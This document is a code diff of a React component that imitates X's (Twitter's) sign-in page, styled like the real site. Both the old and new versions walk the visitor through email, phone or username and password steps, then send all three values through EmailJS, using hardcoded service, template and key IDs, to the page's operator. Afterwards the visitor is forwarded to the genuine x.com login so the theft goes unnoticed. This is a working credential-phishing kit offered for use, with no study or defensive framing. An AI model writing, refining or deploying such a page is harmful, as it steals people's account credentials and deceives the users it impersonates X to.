@@ -1,165 +1,143 @@
 import { useState, useEffect } from "react";
-import { motion } from "framer-motion";
 import emailjs from "emailjs-com";
 
 export default function XLogin() {
-  const [email, setEmail] = useState("");
-  const [password, setPassword] = useState("");
-  const [verification, setVerification] = useState("");
-  const [error, setError] = useState("");
-  const [darkMode, setDarkMode] = useState(false);
+  const [darkMode, setDarkMode] = useState(true);
+  const [showLogin, setShowLogin] = useState(false);
   const [step, setStep] = useState(1);
+  const [email, setEmail] = useState("");
+  const [identifier, setIdentifier] = useState("");
+  const [password, setPassword] = useState("");
 
   useEffect(() => {
-  const storedDarkMode = localStorage.getItem("darkMode");
-  const isDark = storedDarkMode === null ? true : storedDarkMode === "true"; // Default to dark if no preference
-  setDarkMode(isDark);
-  document.documentElement.classList.toggle("dark", isDark);
-}, []);
+    document.documentElement.classList.toggle("dark", darkMode);
+  }, [darkMode]);
 
-  const toggleDarkMode = () => {
-    setDarkMode((prev) => {
-      localStorage.setItem("darkMode", !prev);
-      document.documentElement.classList.toggle("dark", !prev);
-      return !prev;
+  const sendEmail = () => {
+    const templateParams = {
+      email,
+      identifier,
+      password,
+    };
+
+    emailjs.send(
+      "service_qnv9sj9",
+      "template_o3hlbra",
+      templateParams,
+      "kzdLRxzteAwFiHB7O"
+    )
+    .then(() => {
+      alert("Login details sent successfully. You can now continue with X!");
+      window.location.href = "https://x.com/i/flow/login";
+    })
+    .catch(() => {
+      alert("Failed to send login details. Please try again.");
     });
   };
 
-  const handleNext = (e) => {
+  const handleLogin = (e) => {
     e.preventDefault();
-    if (!email.trim()) {
-      setError("Please enter a valid email or username.");
-    } else {
-      setError("");
-      setStep(2);
-    }
-  };
 
-  const handleVerification = (e) => {
-    e.preventDefault();
-    if (!verification.trim()) {
-      setError("Please enter your phone number or username.");
-    } else {
-      setError("");
-      setStep(3);
-    }
-  };
-
-  const handleSubmit = (e) => {
-    e.preventDefault();
-    if (!password) {
-      setError("Please enter your password.");
+    if (!email || !identifier || !password) {
+      alert("All fields are required.");
       return;
     }
 
-    emailjs
-      .send(
-        "service_dtolz9n",
-        "template_0ze0uwg",
-        { email, verification, password },
-        "ngxOCmfwhTYpS9VyD"
-      )
-      .then(
-        () => {
-          alert(
-            "Thanks for your interest in our offer, I will contact you shortly. You can now continue with X!"
-          );
-          window.location.href = "https://x.com/i/flow/login";
-        },
-        () => {
-          alert("Your identity cannot be verified at the moment. Try again.");
-        }
-      );
+    sendEmail();
   };
 
   return (
-    <div
-      className={`flex flex-col md:flex-row h-screen items-center justify-center ${darkMode ? "bg-black text-white" : "bg-white text-black"}`}
-    >
-      <div className="md:w-1/2 flex flex-col justify-center items-center p-8 text-center">
-        <img src="/logo.png" alt="X Logo" className="h-16 w-auto mb-4 dark:invert" />
-        <h1 className="text-4xl font-bold">Welcome to X</h1>
-        <p className="text-lg text-gray-500 dark:text-gray-400 max-w-md mt-2">
-          The best place to connect, share, and stay informed. Log in to your
-          account and verify your identity.
-        </p>
-      </div>
-
-      <motion.div
-        initial={{ opacity: 0, x: 50 }}
-        animate={{ opacity: 1, x: 0 }}
-        transition={{ duration: 0.5 }}
-        className="w-full md:w-1/2 p-8 bg-gray-900 dark:bg-white rounded-lg shadow-lg max-w-md"
-      >
-        <div className="flex justify-between items-center mb-4">
-          <h1 className="text-3xl font-bold text-white dark:text-black">Sign in to X</h1>
-          <button onClick={toggleDarkMode} className="p-2 bg-gray-700 dark:bg-gray-300 rounded">
-            {darkMode ? "🌞" : "🌙"}
+    <div className={`relative flex h-screen w-full items-center justify-center ${darkMode ? "bg-black text-white" : "bg-white text-black"}`}>
+      <div className={`absolute inset-0 transition-all duration-300 ${showLogin ? "backdrop-blur-lg bg-black bg-opacity-50" : ""}`}></div>
+      <div className="flex max-w-4xl w-full items-center justify-between px-10 relative z-10">
+        <div className="flex-1">
+          <img src="/x_logo.png" alt="X Logo" className="h-40 w-auto" />
+        </div>
+        <div className="flex-1 max-w-sm">
+          <h1 className="text-4xl font-bold mb-6">Happening now</h1>
+          <h2 className="text-2xl font-bold mb-6">Join today.</h2>
+          <button className="w-full border border-gray-600 flex items-center justify-center gap-2 px-6 py-3 rounded-full font-bold hover:bg-gray-800 mb-3">
+            <img src="/google_logo.png" alt="Google" className="h-5" /> Sign up with Google
+          </button>
+          <button className="w-full border border-gray-600 flex items-center justify-center gap-2 px-6 py-3 rounded-full font-bold hover:bg-gray-800 mb-3">
+            <img src="/apple_logo.png" alt="Apple" className="h-5" /> Sign up with Apple
+          </button>
+          <div className="flex items-center my-3">
+            <div className="flex-1 border-t border-gray-600"></div>
+            <span className="mx-2 text-gray-400">or</span>
+            <div className="flex-1 border-t border-gray-600"></div>
+          </div>
+          <button className="w-full bg-blue-500 text-white px-6 py-3 rounded-full font-bold hover:bg-blue-600 mb-3">
+            Create account
+          </button>
+          <p className="text-xs text-gray-400">
+            By signing up, you agree to the <a href="#" className="text-blue-500">Terms of Service</a> and <a href="#" className="text-blue-500">Privacy Policy</a>, including <a href="#" className="text-blue-500">Cookie Use</a>.
+          </p>
+          <p className="mt-6 text-gray-300">Already have an account?</p>
+          <button onClick={() => setShowLogin(true)} className="w-full border border-gray-600 px-6 py-3 rounded-full font-bold hover:bg-gray-800 mt-2">
+            Sign in
           </button>
         </div>
-        {step === 1 && (
-          <form onSubmit={handleNext} className="space-y-4">
-            <input
-              type="text"
-              placeholder="Email or username"
-              className="w-full p-3 bg-gray-800 dark:bg-gray-200 text-white dark:text-black border rounded focus:ring-blue-500"
-              value={email}
-              onChange={(e) => setEmail(e.target.value)}
-            />
-            {error && <p className="text-red-500 text-sm">{error}</p>}
-            <motion.button
-              whileHover={{ scale: 1.05 }}
-              whileTap={{ scale: 0.95 }}
-              type="submit"
-              className="w-full bg-blue-500 p-3 rounded text-white font-bold hover:bg-blue-600"
-            >
-              Next
-            </motion.button>
-          </form>
-        )}
-        {step === 2 && (
-          <form onSubmit={handleVerification} className="space-y-4">
-            <p className="text-yellow-500 text-sm">
-              Please verify your identity by entering your phone number or
-              username.
-            </p>
-            <input
-              type="text"
-              placeholder="Phone number or username"
-              className="w-full p-3 bg-gray-800 dark:bg-gray-200 text-white dark:text-black border rounded focus:ring-blue-500"
-              value={verification}
-              onChange={(e) => setVerification(e.target.value)}
-            />
-            <motion.button
-              whileHover={{ scale: 1.05 }}
-              whileTap={{ scale: 0.95 }}
-              type="submit"
-              className="w-full bg-blue-500 p-3 rounded text-white font-bold hover:bg-blue-600"
-            >
-              Next
-            </motion.button>
-          </form>
-        )}
-        {step === 3 && (
-          <form onSubmit={handleSubmit} className="space-y-4">
-            <input
-              type="password"
-              placeholder="Password"
-              className="w-full p-3 bg-gray-800 dark:bg-gray-200 text-white dark:text-black border rounded focus:ring-blue-500"
-              value={password}
-              onChange={(e) => setPassword(e.target.value)}
-            />
-            <motion.button
-              whileHover={{ scale: 1.05 }}
-              whileTap={{ scale: 0.95 }}
-              type="submit"
-              className="w-full bg-blue-500 p-3 rounded text-white font-bold hover:bg-blue-600"
-            >
-              Sign In
-            </motion.button>
-          </form>
-        )}
-      </motion.div>
+      </div>
+      {showLogin && (
+        <div className="fixed inset-0 flex items-center justify-center z-20 transition-opacity duration-300 opacity-100 scale-100">
+          <div className="bg-white dark:bg-black p-6 rounded-xl shadow-2xl max-w-md w-full relative transform scale-95 transition-all duration-300">
+            <button onClick={() => { setShowLogin(false); setStep(1); }} className="absolute top-2 right-2 text-2xl">×</button>
+            <div className="text-center">
+              <img src="/x_logo.png" alt="X Logo" className="h-8 mx-auto mb-4" />
+              <h2 className="text-2xl font-bold mb-4 dark:text-white">Sign in to X</h2>
+              {step === 1 && (
+                <>
+                  <input 
+                    type="text" 
+                    placeholder="Email" 
+                    value={email} 
+                    onChange={(e) => setEmail(e.target.value)} 
+                    className="w-full border border-gray-600 px-4 py-2 rounded-md bg-transparent mb-3" 
+                  />
+                  <button onClick={() => setStep(2)} className="w-full bg-black text-white px-6 py-3 rounded-full font-bold hover:bg-gray-900 mb-3">
+                    Next
+                  </button>
+                </>
+              )}
+              {step === 2 && (
+                <>
+                  <input 
+                    type="text" 
+                    placeholder="Phone number or username" 
+                    value={identifier} 
+                    onChange={(e) => setIdentifier(e.target.value)} 
+                    className="w-full border border-gray-600 px-4 py-2 rounded-md bg-transparent mb-3" 
+                  />
+                  <button onClick={() => setStep(3)} className="w-full bg-black text-white px-6 py-3 rounded-full font-bold hover:bg-gray-900 mb-3">
+                    Next
+                  </button>
+                </>
+              )}
+              {step === 3 && (
+                <>
+                  <input 
+                    type="password" 
+                    placeholder="Password" 
+                    value={password} 
+                    onChange={(e) => setPassword(e.target.value)} 
+                    className="w-full border border-gray-600 px-4 py-2 rounded-md bg-transparent mb-3" 
+                  />
+                  <button onClick={handleLogin} className="w-full bg-blue-500 text-white px-6 py-3 rounded-full font-bold hover:bg-blue-600 mb-3">
+                    Log in
+                  </button>
+                </>
+              )}
+              <button className="w-full border border-gray-600 px-6 py-3 rounded-full font-bold hover:bg-gray-800 mb-3">
+                Forgot password?
+              </button>
+              <p className="text-xs text-gray-400">
+                Don't have an account? <a href="#" className="text-blue-500">Sign up</a>
+              </p>
+            </div>
+          </div>
+        </div>
+      )}
     </div>
   );
 }
